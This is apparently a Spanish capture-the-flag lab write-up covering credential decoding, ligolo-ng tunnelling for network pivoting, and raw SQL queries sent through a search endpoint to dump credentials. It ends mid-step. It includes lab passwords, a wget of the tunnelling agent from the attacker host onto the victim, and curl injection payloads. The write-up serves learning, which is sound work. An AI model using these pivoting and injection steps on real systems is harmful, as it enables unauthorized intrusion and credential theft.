Desplegamos el entorno:
![[Pasted image 20240918080245.png]]
Hacemos el escaneo de nmap a la primera máquina, donde tiene abiertos los puertos 80 y 22:

Esta es la web que corre por el puerto 80:
![[Pasted image 20240918080407.png]]
Y en el código fuente, encontramos un hash:
![[Pasted image 20240918080434.png]]
Tratamos de decodearlo usando **base64** pero no tenemos resultado. Usando [cyberchef](https://cyberchef.io/) vemos que esta encodeado primero usando **base32** y luego en **base64** para darnos un resultado en **hexadecimal**. Usamos `xxd -r -p` para pasar de hexadecimal a texto simple:
```bash
$ echo 'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q====' | base32 --decode | base64 --decode | xxd -r -p
```
![[Pasted image 20240918080702.png]]
O también podríamos usar el siguiente script de python:
```python
import base64

# Paso 1: Recibir la cadena Base32 desde el input del usuario
data = input("Introduce la cadena en base32: ")

try:
    # Paso 2: Decodificar Base32
    base32_decoded = base64.b32decode(data)

    # Paso 3: Decodificar Base64
    base64_decoded = base64.b64decode(base32_decoded)

    # Paso 4: Interpretar el contenido como texto hexadecimal en UTF-8
    hexadecimal = base64_decoded.decode('utf-8')  # Decodificar directamente como texto
    print(f"El texto en hexadecimal es: {hexadecimal}")

    # Separar el texto hexadecimal en valores
    hex_values = hexadecimal.split()

    # Convertir cada valor hexadecimal a su carácter ASCII
    text = ''.join([chr(int(value, 16)) for value in hex_values])

    # Mostrar el resultado
    print(f"El texto final es: {text}")

except:
    print("Hubo un error.")
```
![[Pasted image 20240918082058.png]]
Vemos la contraseña para el usuario derbero:
```bash
cerbero:P0seidón2022!
```
![[Pasted image 20240918082212.png]]
Una vez dentro, vamos a usar ligolo para acceder al siguiente equipo:
![[Pasted image 20240918082249.png]]
```bash
https://github.com/Nicocha30/ligolo-ng
```
![[Pasted image 20240918082257.png]]
Nos bajamos el repositorio:
```bash
git clone https://github.com/nicocha30/ligolo-ng.git
```
Y ahora para ejecutar el proxy debemos tener go instalado:
```bash
sudo apt install golang
```
Y una vez dentro compilamos el agente y el proxy:
```bash
go build -o ligolo-client ./cmd/agent/
go build -o ligolo-proxy ./cmd/proxy/
```
![[Pasted image 20240918084429.png]]
![[Pasted image 20240918084440.png]]
Y lo compartimos con la máquina:
```bash
wget http://10.10.10.1:5000/ligolo-client
chmod +x ligolo-client | xargs ls -l
```
![[Pasted image 20240918084702.png]]
Y ahora para instalar todas las dependencias ejecutamos lo siguiente:
```bash
go mod tidy
```
![[Pasted image 20240918084542.png]]
Y ahora ya tendremos compilado el agente y proxy:
![[Pasted image 20240918084616.png]]
Ahora desde la máquina atacante ejecutamos el ligolo-proxy:
```bash
sudo ./ligolo-proxy -selfcert
```
![[Pasted image 20240918084806.png]]
Y ahora desde la máquina víctima ejecutamos el cliente para conectarnos con el servidor:
```bash
./ligolo-client -connect 10.10.10.1:11601 -ignore-cert
```
![[Pasted image 20240918084908.png]]
Vemos que se ha establecido la conexión. En el proxy seleccionamos la sesión recien creada con `session`. Una vez elegida ejecutamos `autoroute`. Elegimos la red a la que queremos pivotar, le indicamos que nos cree una interfaz nueva y que inicie el tunel:
```bash
session
autoroute
20.20.20.2/24
```
![[Pasted image 20240918085306.png]]
Y en este punto ya tenemos acceso a la siguiente máquina:
![[Pasted image 20240918085330.png]]
Donde veremos que tiene también abiertos los puertos 80 y 22:
![[Pasted image 20240918085910.png]]
![[Pasted image 20240918085545.png]]
En esta ocasión tampoco encontramos nada relevante, pero si hacemos clic en el botón de buscar, nos encuentra el directorio oraculo.html:
![[Pasted image 20240918085627.png]]
Y si hacemos fuzzing web, encontramos el fichero **database.php** que vemos como hace la consulta a la BBDD:
```bash
gobuster dir -u 'http://20.20.20.3' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
```
![[Pasted image 20240918085847.png]]
Este es el contenido de oraculo.html:
![[Pasted image 20240918085734.png]]
```bash
curl -vvvv http://20.20.20.3/buscador/oraculo.html
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const buscar = input.value.trim();
  if (buscar !== '') {
    fetch('../database.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `buscar=${encodeURIComponent(buscar)}`,
    })
      .then((response) => response.text())
      .then((data) => {
        resultado.innerHTML = data;
      })
      .catch((error) => console.error(error));
  }
```
Vamos a hacer la siguiente consulta teniendo en cuenta que se utiliza el parámetro buscar:
```bash
curl --data 'buscar=select name from sqlite_master' http://20.20.20.3/database.php
```
![[Pasted image 20240918090822.png]]
Y vamos a seleccionar todo de la tabla atlantis:
```bash
curl --data 'buscar=select * from atlantis' http://20.20.20.3/database.php
```
![[Pasted image 20240918090936.png]]
Y ahora usaremos el script de python para convertir la contraseña del usuario megalodon de base32 a texto normal:
```bash
megalodon:Templ02019!
```
![[Pasted image 20240918091134.png]]
Y entramos por ssh:
![[Pasted image 20240918091206.png]]
Ahora subimos por scp a esta máquina el agente de ligolo:
```bash
scp ligolo-client megalodon@20.20.20.3:/home/megalodon
```
![[Pasted image 20240918091758.png]]
Y ya lo tenemos en la máquina víctima intermedia:
![[Pasted image 20240918091828.png]]
Esta vez en vez de conectar el agente al proxy vamos a hacer en el sentido contrario. Poner a la escucha el agente y conectarnos desde el proxy. Ponemo el agente a la escucha con el argumento `bind` y la `IP` y el `puerto` donde estará a la escucha:
```bash
./agent -bind 0.0.0.0:7777
connect_agent --ip 20.20.20.3:7777
```
Ahora desde el proxy nos conectamos a Poseidon y elegimos la nueva sesión:
![[Pasted image 20240918092931.png]]
![[Pasted image 20240918093030.png]]
Volvemos al proxy y hacemos otro **autoroute** a la última red, le decimos que nos cree una interfaz nueva y que abra el túnel:
